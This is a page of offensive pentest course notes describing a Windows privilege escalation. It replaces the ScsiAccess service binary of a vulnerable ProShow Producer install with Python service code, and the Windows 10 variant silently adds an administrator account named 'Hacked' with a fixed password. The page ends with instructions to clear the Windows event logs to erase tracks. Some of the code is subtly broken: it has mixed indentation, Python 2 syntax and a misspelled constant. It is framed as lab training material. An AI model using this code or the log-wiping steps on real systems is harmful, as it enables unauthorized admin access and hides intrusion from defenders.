---
title: Privilege escalation - Weak service file permission 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - windows privilege escalation
  - privilege escalation
---

# Privilege escalation - Weak service file permission 

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Setting up the lab

**1.** Download vulnerable application from https://www.exploit-db.com/exploits/24872 and install it for all users on a windows VM.

**2.** Create a non admin account in the Windows VM. For instance:
- user: nonadmin
- password: 123123

**3.** Restart the windows VM and login as nonadmin user.

**4.** Open the PhotoDex application and in Task Manager locate the service that gets created by the application. It's called ScsiAccess.ç

**5.** Open properties of ScsiAccess service and locate the path to executable. It should be something like:

```
C:\Program Files\Photodex\ProShow PRoducer\ScsiAccess.exe
```

**6.** We can replace that file with a malicious service file that will be triggered when opening the Photodex application and get us escalated to admin privileges.

**7.** Script for windows 7 app. Go to step 8 for windows 10. Jump to step 9 after this step.

```python
# Windows 7
import servicemanager
import win32serviceutil
import win32service
import win32api

import os
import ctypes

class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = 'ScsiAccess'
    _svc_display_name_ = 'ScsiAccess'

    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)

    def sleep(self, sec):
        win32api.Sleep(sec*1000, True)

    def SvcDoRun(self):

        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.start()

        except:
            self.SvcStop()
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPEED)

    def start(self):
        self.runflag=True
        
        f = open('C:/Users/nonadmin/Desktop/priv.txt', 'w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            f.write('[-] We are NOT admin')
        else:
            f.write('[+] We are admin')
        f.close()
        
    def stop(self):
        self.runflag=False

if __name__ == '__main__':


    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service)


```

We can use py2exe to craft an exe file for that python script:

This setup file will convert the python script scsiaccess.py into an exe file:

```python
from distutils.core import setup
import py2exe, sys, os

sys.arg.append("py2exe")
setup(
	  options = {'py2exe': {'bundle_files': 1}},
	  windows = [ {'script': "scsiaccess.py"}],
	  zipfule = None
)
```

You can also use [pyinstaller](../pyinstaller.md):

```bash
Pyinstaller --onfile Create_New_Admin_account.py
```

**8.** Script for Windows 10:

```python
# The order of importing libraries matter. "servicemanager" should be imported after win32X. As following:-

import win32serviceutil
import win32service
import win32api
import win32timezone
import win32net
import win32netcon
import servicemanager

## the rest of the code is still the same
import os
import ctypes

class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = 'ScsiAccess'
    _svc_display_name_ = 'ScsiAccess'

    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)

    def sleep(self, sec):
        win32api.Sleep(sec*1000, True)

    def SvcDoRun(self):

        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.start()

        except:
            self.SvcStop()
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPEED)

    def start(self):
        self.runflag=True
        
		USER = "Hacked"
		GROUP = "Administrators"
		user_info = dict (
			name = USER,
			password = "python",
			priv = win32netcon.USER_PRIV_USER,
			home_dir = None,
			comment = None,
			flags = win32netcon.UF_SCRIPT,
			script_path = None
			 )
		user_group_info = dict (
			domainandname = USER
			)
		try:
			win32net.NetUserAdd (None, 1, user_info)
			win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])
		except Exception, x:
			pass
		'''	
        f = open('C:/Users/nonadmin/Desktop/priv.txt', 'w')
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            f.write('[-] We are NOT admin')
        else:
            f.write('[+] We are admin')
        f.close()
        '''
    def stop(self):
        self.runflag=False

if __name__ == '__main__':


    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service)

```


To export into EXE use:

```
Pyinstaller --onfile Create_New_Admin_account.py`
```

**9.** Replace the service file, under

```
C:\Program Files (x86)\Photodex\ProShow Producer`
```


**10.** Rename the original scsiaccess to scsiaccess123.

**11.** Put your Python exe as scsiaccess  (without .exe).

**12.** Restart and test- You should see "Hacked" account been created.


### Python script to check if we are admin users on Windows

```python
import ctypes
	if ctypes.windll.shell32.IsUserAnAdmin() == 0:
		print '[-] We are NOT admin! '
	else:
		print '[+] We are admin :) '
```


## Erasing tracks

Once you are admin, open Event Viewer and go to Windows Logs. Click right button on Applications and Security and the option "Clear Logs".